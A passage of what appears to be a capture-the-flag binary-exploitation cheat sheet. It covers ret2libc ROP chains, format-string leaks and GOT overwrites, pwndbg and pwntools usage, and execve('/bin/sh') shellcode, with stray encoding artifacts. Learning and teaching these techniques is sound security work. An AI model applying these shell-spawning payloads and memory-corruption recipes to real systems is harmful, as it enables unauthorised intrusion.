/bin/sh: system = libc_base + system_offset binsh = libc_base + offset_of_bin_sh Deploy ROP: Use gadget pop rdi; ret to set argument for system. Example ROP: p64(pop_rdi_ret) + p64(binsh) + p64(system) üìå Example on x86 Attack procedure on x86 may include: Send data into writable area such as /bin/sh: read(0, writableArea, len(\"/bin/sh\")) Print address of read_got: write(1, read_got, len(str(read_got))) Read new address from read_got: read(0, read_got, len(str(read_got))) Call system with writableArea containing ‚Äú/bin/sh‚Äù: system(writableArea) üìè OUT OF BOUNDS Out of Bounds (OOB): Occurs when array index is negative or exceeds array length =&gt; Leak/overwrite memory. Accessing array element: &amp;arr[k] = arr + sizeof(elem) * k üî† FORMAT STRING VULNERABILITY (FSB) How printf Works printf(\"%s\", input): Prints the string passed in input. printf(\"%s\"): If no argument, prints the value at the first address on the stack. Parameter Specification with $ printf(\"%30$s\"): Prints the value of the 30th argument on the stack. printf(\"%6$p\"): Prints the address (in hex with 0x) of the 6th argument on the stack. printf(\"%6$x\"): Prints the hex value of the 6th argument on the stack, without 0x. Applications of Format String Information leak: Use format specifiers like %p, %x, %d, %*n to leak values on the stack (addresses, numbers, ‚Ä¶). Read memory: Use %s to print a string at the address referenced from the stack (e.g.: read flag). Overwrite memory: Use %n, %hn, %hhn to write the number of printed characters to a specific address, allowing modification of variables in memory. Difference between 32-bit and 64-bit 32-bit: Arguments are usually printed directly from the stack. 64-bit: First 5 arguments are passed via registers: rsi, rdx, rcx, r8, r9. From the 6th argument onward, values are taken from the stack (e.g.: rsp, rsp+0x8, rsp+0x10, rsp+0x18). üêû Pwndbg Pwndbg is an extension for GDB that provides many useful commands for analyzing and exploiting binaries. Documentation pwndbg reference üîç Some useful commands checksec: show security features of the binary: Canary: anti buffer overflow (often set at [rbp-0x8]). NX (Non-Executable): prevents execution of shellcode on the stack. PIE (Position Independent Executable): Binary is loaded at a random address. RELRO (RELocation Read-Only): Checks the protection feature of the address table (GOT). (anti GOT overwrite) start: run the program and stop right at the beginning of the main function, helping you quickly start debugging. disass &lt;func&gt; (disassemble): disassemble the specified function. vmmap: show virtual memory map of the process, including regions: stack, heap, libraries, and other segments, also displays their permissions, size, offsets and file paths. run: execute the program from the beginning. b *&lt;address&gt; (break): set a breakpoint at a specific address. Ex: b *0x400123 del &lt;breakpoint&gt; (delete): delete the specified breakpoint. c (continue): continue executing the program until the next breakpoint or when the program stops. finish: continue executing until the current function ends. si (step into): execute the next instruction and step into any functions (if present). ni (next instruction): execute the next instruction but do not step into any functions. i (info): show information about the program state, for example: i r (info registers): Information about the registers. i b (info breakpoints): List of breakpoints. k (kill): kill the debugging process. bt (backtrace): show the call stack at the time of stopping. x (examine): examine memory at a specific address. Form: x/&lt;count&gt;&lt;format&gt; &lt;address&gt; Format Size x (hexadecimal) b (Byte, 1 byte) o (octal) h (Halfword, 2 bytes) d (decimal) w (Word, 4 bytes) u (unsigned decimal) g (Giant, 8 bytes) s (string) ¬† t (binary) ¬† f (float) ¬† a (address) ¬† c (character) ¬† i (instruction) ¬† Ex: x/10wx 0x601000 shows 10 words in hex format from address 0x601000. tel (telescope): show memory around the current instruction pointer, recursively explores addresses referenced by the memory to display their values. Ex: tel 0x123456 5 shows 5 lines of memory starting from address 0x123456. tel $rsp shows memory around the stack pointer. context: show an overview of the current state of the process, including registers, stack, and disassembly around the current address. heap: show detailed information about the heap, assisting in the analysis of heap-related vulnerabilities. vis_heap_chunks: visualize heap chunks, showing their metadata and contents. search: search for a string or byte sequence in memory. Ex: search \"flag\" will find all locations containing the string \"flag\". p &amp;&lt;variable&gt; (print): print the address of a specific variable. Ex: p &amp;0x601000 will print the value at address 0x601000. pattern_create and pattern_offset Useful for creating and analyzing pattern strings (cyclic patterns) to find offsets during exploitation: pattern_create 100: Create a pattern with 100 bytes. pattern_offset &lt;value&gt;: Determine the position of the &lt;value&gt; in the pattern. set detach-on-fork off: tells GDB to not detach from the other processes after program calls fork()/vfork(). Both parent and child processes will stay under GDB as separate inferiors. set follow-fork-mode child/parent: process that GDB will follow after a fork. info inferiors: list tracked processes. inferior &lt;id&gt;: switch to a specific inferior process. üß∞ Pwntools PwnTools is a powerful library that supports binary exploitation and automation. Here are some basic commands and techniques: üîπ Process &amp; Remote from pwn import * # Start a local process p = process('./filename') # Local binary # Connect to remote server p = remote('address', port) # Remote server # Attach gdb for debugging (with pwntools API) gdb.attach(p, api=True, gdbscript='''pwndbg_script''') üîπ ELF &amp; Libc # Load binary and libc e = ELF('./filename') libc = ELF('./libc.so.6') # Get address from PLT (Procedure Linkage Table) plt_addr = e.plt['funcname'] # Get address from GOT (Global Offset Table) got_addr = e.got['funcname'] # Get offset of function in binary func_offset = e.symbols['funcname'] # Get offset of function in libc (note: symbol name must be exact) libc_func_offset = libc.symbols['funcname'] # Find location of \"/bin/sh\" string in libc bin_sh = list(libc.search(b'/bin/sh'))[0] üîπ Packing &amp; Unpacking # Convert number to little-endian byte string (64-bit and 32-bit) packed_64 = p64(0xdeadbeef) packed_32 = p32(0xdeadbeef) # Unpack byte string to integer (64-bit and 32-bit) number_64 = u64(b'\\xef\\xbe\\xad\\xde\\x00\\x00\\x00\\x00') number_32 = u32(b'\\xef\\xbe\\xad\\xde') üîπ Sending and receiving data # Send data p.send(b'A') # Send 1 byte 'A' p.sendline(b'A') # Send 'A' + '\\n' # Send data after receiving prompt p.sendafter(b'hello', b'A') p.sendlineafter(b'hello', b'A') #send and sendline send: read sendline: scanf, gets, fgets # Receive data data = p.recv(1024) # Receive up to 1024 bytes line = p.recvline() # Receive until newline exact = p.recvn(5) # Receive exactly 5 bytes until = p.recvuntil(b'hello') # Receive until 'hello' is found all_data = p.recvall() # Receive all data until process ends üîπ Shellcode # Shellcode shellcode = asm('''' ;write your shellcode here mov rax, 0x3b ; syscall number for execve mov rdi, rsp ; rdi = pointer to \"/bin/sh\" xor rsi, rsi ; rsi = NULL xor rdx, rdx ; rdx = NULL syscall ''') üîπ Otherwise, use pwntools built-in shellcode generation: # Spawn a shell (execve /bin/sh) shellcode = shellcraft.sh() # Generate shellcode to read and print 'flag.txt' shellcode = shellcraft.readfile('flag.txt') # Open, read and write shellcode = shellcraft.open('flag.txt') shellcode += shellcraft.read('rax', 'rsp', 100) shellcode += shellcraft.write(1, 'rsp', 100) #Finnally, assemble the shellcode shellcode = asm(shellcode) Visit here for more shellcode examples. Remember to use context.arch = 'amd64' or 'i386' to set the architecture before generating shellcode. üîπ Format string # Write value to address using format string fmtstr_payload( offset, writes, numbwritten: int = 0, write_size: str = 'byte', write_size_max: str = 'long', overflows: int = 16, strategy: str = \"small\", badbytes: frozenset = frozenset(), offset_bytes: int = 0, no_dollars: bool = False ) #Ex: write one_gadget to read_got offset = 5 # Check in gdb where = read_got what = one_gadget payload = fmtstr_payload(offset, { where: what }) üîπ Print &amp; Interactive # Print info to console log.info(\"Useful info\" + info) log.success(\"Success info\" + info) log.warning(\"Warning info\" + info) # Switch to interactive mode to interact directly with process p.interactive() Other commands can be found in the official documentation / cheat sheet. üîó Pwninit Pwninit is a tool for patching binaries with provided libc and loader. Commands: pwninit: auto patch file mv file_patch file: rename file üõ†Ô∏è Other useful tools CyberChef : tool for analyzing and decoding data LinuxSyscallReference : tool for looking up Linux syscalls and their parameters Online Assembler/Disassembler : tool for assembling and disassembling x86/x64 Shell-storm : tool for converting. Libc Database : tool for searching libc versions based on leaked addresses üî∞ Learning resources Dream Hack: basic system hacking Leonardo, JHTPwner: friendly beginner tutorials Nightmare: resources + writeups Naetw: pwn tips Nobody: pwn writeups + interesting tricks Azeria Labs: basic heap exploitation Heap: heap exploitation techniques Midas: linux kernel exploitation" } ]
